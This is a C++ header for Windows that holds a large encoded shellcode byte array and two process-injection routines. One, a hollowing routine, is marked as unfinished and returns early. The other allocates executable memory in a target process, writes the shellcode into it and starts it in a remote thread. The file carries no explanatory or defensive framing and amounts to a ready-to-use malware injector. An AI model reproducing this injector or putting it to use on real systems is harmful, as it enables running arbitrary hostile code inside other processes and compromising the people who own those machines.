#pragma once
#include <Windows.h>
#include <psapi.h>
#include "Internals.h"

unsigned char shellcode[] =
"\xba\x17\x06\x43\x69\xd9\xe8\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\xd1\x31\x50\x14\x83\xc0\x04\x03\x50\x10\xf5\xf3\xbf\x81\x70"
"\xfb\x3f\x52\xe2\x75\xda\x63\x30\xe1\xae\xd6\x84\x61\xe2\xda"
"\x6f\x27\x17\x68\x1d\xe0\x18\xd9\xab\xd6\x17\xda\x1a\xd7\xf4"
"\x18\x3d\xab\x06\x4d\x9d\x92\xc8\x80\xdc\xd3\x35\x6a\x8c\x8c"
"\x32\xd9\x20\xb8\x07\xe2\x41\x6e\x0c\x5a\x39\x0b\xd3\x2f\xf3"
"\x12\x04\x9f\x88\x5d\xbc\xab\xd6\x7d\xbd\x78\x05\x41\xf4\xf5"
"\xfd\x31\x07\xdc\xcc\xba\x39\x20\x82\x84\xf5\xad\xdb\xc1\x32"
"\x4e\xae\x39\x41\xf3\xa8\xf9\x3b\x2f\x3d\x1c\x9b\xa4\xe5\xc4"
"\x1d\x68\x73\x8e\x12\xc5\xf0\xc8\x36\xd8\xd5\x62\x42\x51\xd8"
"\xa4\xc2\x21\xfe\x60\x8e\xf2\x9f\x31\x6a\x54\xa0\x22\xd2\x09"
"\x04\x28\xf1\x5e\x3e\x73\x9e\xce\x5b\xf8\x5e\x67\xd4\x69\x31"
"\x1e\x4e\x02\x81\x97\x48\xd5\xe6\x8d\x7c\xd9\x18\x2e\x7c\xeb"
"\xe7\x79\x2b\x5c\x4f\xd1\xbb\x58\x39\xa4\x9c\x62\x10\xbf\x46"
"\x9c\x9b\x40\xdd\xac\x52\x11\xb0\xa4\x67\xc3\x63\x51\xd3\xe2"
"\x83\xa1\x70\xb5\xeb\xf6\xff\xaa\x2d\x07\x2a\x84\x58\x74\xd5"
"\x25\x9a\xde\xe7\xf7\xc8\x88\x07\xca\x4c\xcc\x5a\x78\xde\x9e"
"\x08\x2c\xb6\xcb\xf8\xe2\x7d\xf3\xd6\x72\x47\x88\x1a\xd4\x2f"
"\x0f\xaf\xd5\xaf\x86\x30\xbf\xab\xc8\xda\x5f\xe5\x80\x6f\x26"
"\x97\xd7\x6f\x73\xf8\xe6\x70\x2b\x51\x63\x70\x87\x0b\x1b\xa3"
"\x2e\xab\xa0\x44\xfb\x4e\x96\xb4\x80\x9a\x16\xcb\x88\x2b\xe6"
"\x4e\x7e\x3f\x1c\xd8\x86\x54\x15\xb2\xd2\x6f\xc4\x1f\xdc\xba"
"\x80\x61\x4a\x01\xb2\x3f\xba\x76\x61\x8e\x43\xdf\xe0\xf6\xea"
"\x89\xa4\x90\xbb\x62\xa5\x6a\x3b\x59\x9a\x6d\xec\x61\xe5\x54"
"\x35\x14\xe2\xfe\xe9\x3f\x97\x01\xf6\x40\x59\x01\xe0\x2f\x9b"
"\xfd\xf3\xa6\x55\xfc\xf3\x38\x8e\x90\x0c\xc7\xb1\x40\xb0\x7b"
"\x38\xc8\x36\xfd\x04\x6c\x69\xc6\x8a\x52\x03\x93\xb6\x0e\xba"
"\x0c\x4c\xaa\xcc\x5b\xb1\xc9\x8c\x9c\x37\xa4\xff\xeb\x78\xe1"
"\xec\x1e\x80\x7b\x42\x3d\xe5\x56\x14\xc1\xfa\xd2\xa0\x6d\x7a"
"\x4f\x04\x31\x35\xd4\x34\x4b\x08\x3b\x34\x39\xfd\x55\xac\xf7"
"\xc9\x0b\xcf\x0c\xb7\x32\x9b\x38\x64\x08\xcd\x28\x16\xa1\x03"
"\x57\x26\x6f\x97\x32\x54\xa2\x16\xdb\xfd\xd2\xec\x19\xde\x67"
"\x62\x27\x77\x14\x10\xb6\xa8\xd1\xc6\x08\x97\x31\x74\x07\xba"
"\x31\x1b\xa3\x2d\xd0\xb7\x2e\x95\x34\x05\xe3\xa0\x71\xb5\x32"
"\x03\x54\x85\x0f\x43\xff\x8c\x01\xe7\x90\x39\xae\xc7\x20\x92"
"\x70\x3e\x93\x28\x4b\x1e\xbf\x3e\xc2\x3a\x5a\xd1\x60\xec\x92"
"\x03\xb8\xdb\xd7\x51\xb8\x60\x62\x7f\x8f\x33\xa2\x7b\xe7\x4c"
"\xc7\x90\x82\x44\x54\x90\x2c\x07\xa2\x02\x30\xe0\x0b\xf0\x5a"
"\x0f\x50\x80\x42\x58\x6f\xfa\x23\xb3\x19\x92\xe2\x24\xbc\x14"
"\x76\xf7\xc7\xbb\x03\x26\xfb\xe8\xf7\x4d\x15\x1d\xf7\x0e\xbd"
"\x27\xf5\x8f\x5a\xdf\x18\x0c\x28\xfc\x79\x13\xb2\xb7\xa1\xf4"
"\x17\x8b\x8e\xf4\x7d\xb3\x80\x2b\xe1\xdd\x97\xed\xb8\x19\xff"
"\xd5\x4a\x18\x73\x57\x19\xda\x2b\xe2\xf1\x56\x46\x84\xf6\xea"
"\x13\x03\x5a\x47\x3a\xce\x48\x3e\x6e\xc9\x5b\xe2\xa5\xd4\x21"
"\x8c\x77\xd2\xb7\x35\xea\x5a\x2c\xcc\xde\x2e\x05\xf0\x1c\x8a"
"\xbc\x3e\xa3\x5d\xd0\xd5\x7a\x7b\xed\x52\x3c\xd6\x23\x8c\x8f"
"\xee\xed\x33\x1e\x57\x32\x89\x74\x27\x80\xd5\x8a\xe1\xc5\x5c"
"\x3a\x8f\x9e\xec\x3a\x07\xe4\x38\x1f\x43\x46\xc9\x90\xaf\x3d"
"\xf2\xdf\x5e\xee\x55\x67\x9f\xb7\x1e\xbe\x9d\xab\x73\x76\xde"
"\x51\xb0\xbf\x16\xdb\x05\x1b\x6f\xfd\x6b\x87\xf1\xbb\x60\x3e"
"\xce\x23\x50\xe3\xd3\x39\xdb\x89\x7f\x50\x2e\x91\xa4\x9b\x17"
"\xd3\xb8\xda\x6a\xb8\xc3\xb4\x64\x0b\x61\x12\x7a\xa6\x0c\xdb"
"\xec\x48\xc1\xdb\xec\x20\xe1\xdb\xac\xb0\xb6\xb3\x74\x14\x6b"
"\xa1\x7a\x81\x1f\x90\x85\x29\x20\xe3\x84\xf0\x71\xb0\x0f\xe5"
"\x25\x5e\x10\xc9\xc9\x9e\x43\x5f\xa2\x8c\xf5\xd6\xd0\x4e\x2c"
"\x6d\xd4\xc5\x09\xe6\xd2\x24\x55\x7d\x1c\x53\xbc\x25\x5e\x74"
"\xb7\x28\x9f\x7a\xf9\xeb\x52\xab\xcb\x3d\xab\x9d\x1b\x6f\xf9"
"\xd8\x5b\x76\x86\xe0\xb1";

BOOL InjectShellcodeByHollowing(PROCESS_INFORMATION processInfo)
{

	_tprintf(TEXT("This is still a WIP"));
	return FALSE;

	HMODULE hNTDLL = LoadLibraryA("ntdll");
	if (!hNTDLL)
	{
		return FALSE;
	}

	FARPROC fpNtQueryInformationProcess = GetProcAddress(hNTDLL,"NtQueryInformationProcess");

	if (!fpNtQueryInformationProcess)
	{
		return 0;
	}

	_NtQueryInformationProcess ntQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	PROCESS_BASIC_INFORMATION* processBasicInfo = new PROCESS_BASIC_INFORMATION();
	DWORD returnLength;
	ntQueryInformationProcess(processInfo.hProcess, 0, processBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);

	/*	if (!ntQueryInformationProcess(processInfo.hProcess, 0, processBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &returnLength))
		{
			DisplayErrorMessage(TEXT("Error querying process information"), GetLastError());
			getchar();
			return FALSE;
		}
		*/
#ifdef DEBUG
	_tprintf(TEXT("Attach debugger..."));
	getchar();
#endif
	PVOID pRemoteImage = VirtualAllocEx (processInfo.hProcess, (LPVOID)processBasicInfo->PebBaseAddress, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!pRemoteImage)
	{
		DisplayErrorMessage(TEXT("Error calling VirtualAlloc"), GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(processInfo.hProcess, (LPVOID)processBasicInfo->PebBaseAddress, shellcode, sizeof(shellcode), nullptr))
	{
		DisplayErrorMessage(TEXT("Error writing process memory"), GetLastError());
		return FALSE;
	}
	return TRUE;
}


BOOL InjectShellcodeIntoNewThread(PROCESS_INFORMATION processInfo)
{

#ifdef DEBUG
	_tprintf(TEXT("Attach debugger..."));
	getchar();
#endif

	const PVOID memoryAddress = VirtualAllocEx(processInfo.hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!memoryAddress)
	{
		DisplayErrorMessage(TEXT("Error calling VirtualAlloc"), GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(processInfo.hProcess, memoryAddress, shellcode, sizeof(shellcode), nullptr))
	{
		DisplayErrorMessage(TEXT("Error writing process memory"), GetLastError());
		return FALSE;
	}

	if (!CreateRemoteThread(processInfo.hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)memoryAddress, nullptr, PAGE_EXECUTE_READWRITE, nullptr))
	{
		DisplayErrorMessage(TEXT("Error creating thread"), GetLastError());
		return FALSE;
	}
	return TRUE;
}